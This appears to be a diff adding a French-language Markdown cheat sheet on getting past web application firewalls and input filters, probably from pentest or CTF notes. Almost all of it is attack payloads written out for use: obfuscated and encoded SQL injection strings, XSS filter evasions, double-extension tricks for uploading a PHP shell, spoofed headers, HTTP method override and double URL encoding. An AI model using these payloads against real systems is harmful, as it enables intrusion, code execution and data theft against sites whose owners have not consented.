@@ -1,0 +1,44 @@
+# Bypass de filtrage & protections (WAF, extensions, etc.)
+
+Lorsque des filtres empêchent tes attaques classiques, tu peux les contourner avec créativité.
+
+---
+
+🔹 Bypass SQLi
+- Payload classique bloqué : ' OR 1=1 --
+- Payload obfusqué : '/**/OR/**/1=1--
+- Encodé en URL : %27%20OR%201=1--%20
+
+---
+
+🔹 Bypass XSS
+- Filtre <script> ? → <scr<script>ipt>
+- Utiliser des balises alternatives : <img src=x onerror=alert(1)>
+- Encodage HTML : &lt;script&gt;alert(1)&lt;/script&gt;
+
+---
+
+🔹 Bypass extension / Upload
+- Fichiers autorisés : .jpg → renommer shell.php.jpg
+- Double extension : shell.php;.jpg
+- Extensions alternatives : .phtml, .phar, .php5
+
+---
+
+🔹 Bypass par headers
+- User-Agent : simuler un bot, ou contourner des restrictions IP
+- X-Forwarded-For : utile si l’IP est filtrée
+- Referer : peut déclencher des fonctions différentes
+
+---
+
+🔹 Méthodes HTTP alternatives
+- HEAD, PUT, TRACE : parfois autorisées
+- X-HTTP-Method-Override: DELETE (dans une requête POST)
+
+---
+
+🔹 Techniques diverses
+- Injections en base64
+- Double URL encoding : %2527 (pour %27 → ')
+- Payload dans un cookie ou un User-Agent
